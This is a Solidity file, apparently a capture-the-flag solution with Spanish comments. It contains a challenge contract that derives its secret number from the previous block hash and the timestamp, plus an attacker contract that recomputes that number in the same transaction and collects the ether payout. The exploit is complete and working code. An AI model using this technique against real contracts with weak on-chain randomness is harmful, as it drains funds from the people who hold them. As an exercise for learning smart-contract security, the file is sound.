pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract TheNewNumberChallengeAttacker {
  address owner;

  function TheNewNumberChallengeAttacker() public {
    owner = msg.sender;
  }

  function atacarNewNumberChallenge(address _addressVictima) public payable{
    uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), block.timestamp)); //Copio algoritmo que utiliza el contrato víctima.
    
    GuessTheNewNumberChallenge contratoVictima = GuessTheNewNumberChallenge(_addressVictima);
    contratoVictima.guess.value(1 ether)(answer);

     // El tx.origin será mi EOA (la account desde la que iniciamos el test), por lo que una vez solucionado el challenge, nos transferimos el total.
    // require(contratoVictima.isComplete(), "challenge not completed"); 
    tx.origin.transfer(address(this).balance);
  }

  //Función necesaria para que este contrato atacante reciba el ether que le enviará el contrato víctima por adivinar su new number.
  function () external payable {}
}
